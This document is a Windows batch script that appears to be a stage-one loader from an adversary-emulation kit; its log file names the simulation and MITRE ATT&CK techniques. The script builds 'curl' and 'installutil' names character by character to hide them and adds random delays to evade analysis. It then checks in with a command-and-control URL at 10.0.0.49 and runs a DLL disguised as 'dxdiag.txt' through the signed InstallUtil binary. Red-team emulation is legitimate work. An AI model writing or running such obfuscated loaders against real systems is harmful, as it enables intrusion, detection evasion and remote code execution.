@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET zvbnm=%APPDATA%\7994\5fe81671
SET xswed=https://10.0.0.49
SET cftgb=https://10.0.0.49/stage/2/icon.png?7994-7
SET qazxc=ITZEL-S2BO
SET wertf=7
SET rtygh=dxdiag.txt
SET uiopl=7994

REM Setup logging directory
SET asdfg=%APPDATA%\!wertf!
SET lkjhg=!asdfg!\macula-simulations.log
IF NOT EXIST "!asdfg!" MD "!asdfg!" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!qazxc!]: Initializing Stage1 DLL execution>>> "!lkjhg!" 2>nul

REM Initial delay 30-60s using timeout
SET /A idel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Initial delay start !idel!s>>> "!lkjhg!" 2>nul
timeout /t !idel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Initial delay complete>>> "!lkjhg!" 2>nul

REM Obfuscated curl command using multi-layer variable indirection
SET var0=c
SET var1=u
SET var2=r
SET var3=l
SET var4=.exe
SET com1=!var0!!var1!!var2!!var3!!var4!
SET ref1=com1

REM Build curl executable reference with CALL expansion
CALL SET curlcmd=%%!ref1!%%

REM Obfuscated installutil command using array-style variables
SET arr0=i
SET arr1=n
SET arr2=s
SET arr3=t
SET arr4=a
SET arr5=l
SET arr6=l
SET arr7=u
SET arr8=t
SET arr9=i
SET arr10=l
SET arr11=.exe
SET ins1=!arr0!!arr1!!arr2!!arr3!!arr4!!arr5!!arr6!!arr7!!arr8!!arr9!!arr10!!arr11!
SET insref=ins1

REM Obfuscated arguments with multiple indirection layers
SET argA0=/
SET argA1=l
SET argA2=o
SET argA3=g
SET argA4=f
SET argA5=i
SET argA6=l
SET argA7=e
SET argA8==
SET argB0=/
SET argB1=L
SET argB2=o
SET argB3=g
SET argB4=T
SET argB5=o
SET argB6=C
SET argB7=o
SET argB8=n
SET argB9=s
SET argB10=o
SET argB11=l
SET argB12=e
SET argB13==
SET argB14=f
SET argB15=a
SET argB16=l
SET argB17=s
SET argB18=e
SET argC0=/
SET argC1=U
SET argC2=!
SET argC3=!
SET argpart1=!argA0!!argA1!!argA2!!argA3!!argA4!!argA5!!argA6!!argA7!!argA8!
SET argpart2=!argB0!!argB1!!argB2!!argB3!!argB4!!argB5!!argB6!!argB7!!argB8!!argB9!!argB10!!argB11!!argB12!!argB13!!argB14!!argB15!!argB16!!argB17!!argB18!
SET argpart3=!argC0!!argC1!!argC2!!argC3:~0,-1!
SET argfull=!argpart1!!argpart2!!argpart3!

REM Pre-heartbeat delay 5-15s using ping
SET /A pdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Pre-heartbeat delay !pdel!s>>> "!lkjhg!" 2>nul
ping -n !pdel! 127.0.0.1 >nul

REM C2 heartbeat check - CORRECTED IMPLEMENTATION with proper error handling
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Heartbeat check start>>> "!lkjhg!" 2>nul
SET hbresult=0
SET hberror=

REM Execute curl with proper URL and timeout parameters - CRITICAL FIX
!curlcmd! -k -s -o nul --connect-timeout 30 --max-time 60 "!cftgb!"
IF !ERRORLEVEL! EQU 0 (
    SET hbresult=1
) ELSE (
    SET hberror=connection_failed_!ERRORLEVEL!
)

REM Format timestamp for TTP logging (YYYY-MM-DD HH:MM:SS.SSS)
FOR /F "tokens=1-3 delims=/- " %%a IN ("!DATE!") DO (
    SET yyyy=%%c
    SET mm=%%a
    SET dd=%%b
)
SET mm=0!mm!
SET dd=0!dd!
SET yyyy=!yyyy!
SET mm=!mm:~-2!
SET dd=!dd:~-2!
SET hms=!TIME!
IF "!hms:~1,1!"==":" SET hms=0!hms!
SET hms=!hms:~0,2!:!hms:~3,2!:!hms:~6,2!.!hms:~9,2!0
SET fullts=!yyyy!-!mm!-!dd! !hms!

REM Log TTP T1105 heartbeat result
echo [!fullts!][!qazxc!]: !wertf!-!uiopl!-T1105|Ingress Tool Transfer=!hbresult!:!hberror!>>> "!lkjhg!" 2>&1

IF !hbresult! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!qazxc!]: Heartbeat failed, exiting>>> "!lkjhg!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!qazxc!]: Heartbeat successful>>> "!lkjhg!" 2>nul

REM Random delay 5-15s using CHOICE
SET /A cdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Pre-directory change delay !cdel!s>>> "!lkjhg!" 2>nul
CHOICE /C Y /N /D Y /T !cdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Changing to directory !zvbnm!>>> "!lkjhg!" 2>nul
CD /D "!zvbnm!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!qazxc!]: Directory change failed>>> "!lkjhg!" 2>nul
    SET execresult=0
    SET exerror=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s using timeout
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Random delay !rdelay!s before execution>>> "!lkjhg!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil with full .NET Framework path
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Starting DLL execution>>> "!lkjhg!" 2>nul
SET execresult=0
SET exerror=

REM Build full path to installutil with indirection
SET netpart1=%WINDIR%
SET netpart2=\Microsoft.NET\Framework64\v4.0.30319\
SET netpath=!netpart1!!netpart2!
CALL SET instexe=%%!insref!%%
SET fullinst=!netpath!!instexe!

REM Execute installutil with obfuscated arguments
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Executing: !fullinst! !argfull!"!rtygh!" >>> "!lkjhg!" 2>nul
!fullinst! !argfull!"!rtygh!"

IF !ERRORLEVEL! EQU 0 (
    SET execresult=1
) ELSE (
    SET exerror=assembly_load_failed_!ERRORLEVEL!
)

:logexec
REM Log TTP T1218 execution result
echo [!fullts!][!qazxc!]: !wertf!-!uiopl!-T1218|Signed Binary Proxy Execution=!execresult!:!exerror!>>> "!lkjhg!" 2>&1

IF !execresult! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!qazxc!]: DLL execution completed>>> "!lkjhg!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!qazxc!]: DLL execution failed: !exerror!>>> "!lkjhg!" 2>nul
)

REM Final cleanup delay 5-15s using ping
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!qazxc!]: Final cleanup delay !fdel!s>>> "!lkjhg!" 2>nul
ping -n !fdel! 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!qazxc!]: Stage1 complete>>> "!lkjhg!" 2>nul

ENDLOCAL
EXIT /B 0